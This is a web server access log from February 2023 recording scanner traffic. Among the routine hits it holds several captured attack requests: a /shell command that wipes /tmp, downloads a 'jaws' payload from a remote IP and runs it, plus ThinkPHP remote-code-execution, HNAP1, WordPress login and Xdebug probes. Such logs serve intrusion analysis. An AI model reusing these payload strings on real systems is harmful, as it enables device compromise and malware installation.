139.162.200.177 - - [03/Feb/2023:07:51:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
179.43.177.242 - - [03/Feb/2023:07:54:14 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
111.11.221.9 - - [03/Feb/2023:07:56:20 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
60.221.224.111 - - [03/Feb/2023:07:56:38 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
125.45.87.5 - - [03/Feb/2023:07:56:48 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
143.110.222.166 - - [03/Feb/2023:08:08:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.79.172.21 - - [03/Feb/2023:08:37:02 -0600] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.52 - - [03/Feb/2023:08:55:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.246.220.98 - - [03/Feb/2023:09:00:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [03/Feb/2023:09:08:49 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
101.68.211.2 - - [03/Feb/2023:09:26:30 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
5.161.189.8 - - [03/Feb/2023:09:35:15 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
143.110.222.166 - - [03/Feb/2023:10:09:41 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
128.14.134.170 - - [03/Feb/2023:10:11:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.12.253.180 - - [03/Feb/2023:10:17:08 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
152.89.196.211 - - [03/Feb/2023:10:17:09 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 365 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.12.253.180 - - [03/Feb/2023:10:17:41 -0600] "POST /HNAP1/ HTTP/1.1" 301 247 "-" "Mozila/5.0"
35.246.251.56 - - [03/Feb/2023:10:19:05 -0600] "GET / HTTP/1.0" 301 241 "-" "-"
152.89.196.211 - - [03/Feb/2023:10:36:40 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [03/Feb/2023:11:01:44 -0600] "GET /console/ HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [03/Feb/2023:11:05:37 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
